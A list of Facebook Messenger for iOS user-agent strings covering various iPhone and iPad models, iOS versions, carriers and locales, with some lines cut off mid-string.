Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPad; CPU iPad OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/MessengerForiOS;FBAV/142.0.0.38.63;FBBV/77803202;FBDV/iPad8,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/NOS;FBID/phone;FBLC/jv_ID;FBOP/5;FBRV/77803202]
Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/pt_PT;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBAV/151.0.0.45.96;FBBV/90061748;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/MEO;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/Machintosh,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/148.0.0.31.386;FBBV/86952252;FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/;FBID/tablet;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B410 [FBAN/MessengerForiOS;FBAV/153.0.0.47.97;FBBV/91923955;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/8.1;FBSS/2;FBCR/MegaFon;FBID/tablet;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/MegaFon;FBID/phone;FBLC/ru_RU
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Tele2;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.2.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/12.4;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/11.0.0.15.14;FBBV/4026123;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/172.0.0.51.84;FBBV/115215338;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/YOTA;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MobileTeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Beeline;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/MessengerForiOS;FBAV/19.1.0.12.23;FBBV/6318336;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/MobileTeleSystems;FBID/pho
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/58.0.0.32.81;FBBV/22628760;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/ru_R
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/47.0.0.19.116;FBBV/17056928;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/de_
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/55.0.0.28.59;FBBV/20754519;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/MessengerForiOS;FBAV/3.1.2;FBBV/1027309;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.4;FBSS/2; FBCR/MobileTeleSystems;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B511 [FBAN/MessengerForiOS;FBAV/9.1.0.15.14;FBBV/3594432;FBDV/iPhone3,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.3;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/ru
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F70 [FBAN/MessengerForiOS;FBAV/85.0.0.22.69;FBBV/37013644;FBRV/0;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Carrier;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Beeline;FBID/phone;FBLC/r
Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/50.0.0.15.72;FBBV/17975388;FBDV/iPad2,7;FBMD/iPad;FBSN/iPhone OS;FBSV/9.1;FBSS/1; FBCR/MobileTeleSystems;FBID/tablet;FBLC/ru_RU;
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/23.1.0.15.15;FBBV/8176219;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/1]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/15.0.0.15.14;FBBV/4974699;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/64.0.0.28.84;FBBV/26403168;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/
Mozilla/5.0 (iPad; CPU OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/88.0.0.27.69;FBBV/38853002;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/br_pt;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/25.0.0.4.14;FBBV/8936291;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/120.0.0.48.70;FBBV/59774553;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/123.0.0.44.69;FBBV/62323340;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/128.0.0.43.90;FBBV/66013621;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440 [FBAN/MessengerForiOS;FBAV/34.0.0.21.276;FBBV/13810118;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.2;FBSS/2; FBCR/Globe;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Ooredoo;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C101 [FBAN/MessengerForiOS;FBAV/196.0.0.54.99;FBBV/135382157;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1.2;FBSS/3;FBCR/CELCOM;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/TRUE-H;FBID/phone;FBLC/th_TH;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/190.1.0.58.95;FBBV/129822925;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/200.0.0.27.103;FBBV/139866222;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Telcel;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/Free;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
